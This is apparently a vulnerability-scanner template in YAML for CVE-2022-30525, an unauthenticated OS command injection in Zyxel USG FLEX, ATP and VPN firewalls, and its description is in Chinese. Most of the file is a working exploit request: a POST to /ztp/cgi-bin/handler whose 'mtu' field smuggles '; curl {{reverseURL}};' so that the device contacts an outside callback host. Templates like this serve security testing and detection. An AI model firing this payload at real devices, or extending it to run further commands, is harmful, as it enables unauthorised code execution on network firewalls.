id: CVE-2022-30525

info:
  name: Zyxel Firewall - OS Command Injection
  author: zan8in
  severity: critical
  information: |
    Rapid7 发现并报告了一个漏洞，该漏洞影响支持零接触配置 (ZTP) 的 Zyxel 防火墙，其中包括 ATP 系列、VPN 系列和 USG FLEX 系列（包括 USG20-VPN 和 USG20W-VPN）。该漏洞标识为 CVE-2022-30525，允许未经身份验证的远程攻击者以nobody受影响设备上的用户身份执行任意代码。
    title="USG FLEX"
  reference:
    - http://wiki.peiqi.tech/wiki/iot/Zyxel/Zyxel%20USG%20FLEX%20handler%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-30525.html

set:
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  r0:
    request:
      method: POST
      path: /ztp/cgi-bin/handler
      headers:
        Content-Type: application/json
      body: "{\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"port\":\"4\",\"vlan_tagged\":\"1\",\"vlanid\":\"5\",\"mtu\":\"; curl {{reverseURL}};\",\"data\":\"hi\"}"
    expression: reverse.wait(5)
expression: r0() 
